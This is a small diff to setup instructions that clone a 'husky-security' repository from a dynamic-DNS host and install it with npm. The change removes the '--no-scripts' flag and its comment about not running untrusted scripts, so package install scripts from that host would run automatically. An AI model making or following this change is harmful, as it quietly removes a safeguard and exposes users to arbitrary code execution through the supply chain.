@@ -2,7 +2,7 @@ Instructions:
 
     git clone http://ruder-babombpi2.nsupdate.info/husky-security.git
     # inspect package.json
-    npm install --no-scripts # just in case, make sure we don't run any untrusted scripts
+    npm install
     git pull --rebase
 
 A clone of this repo is at
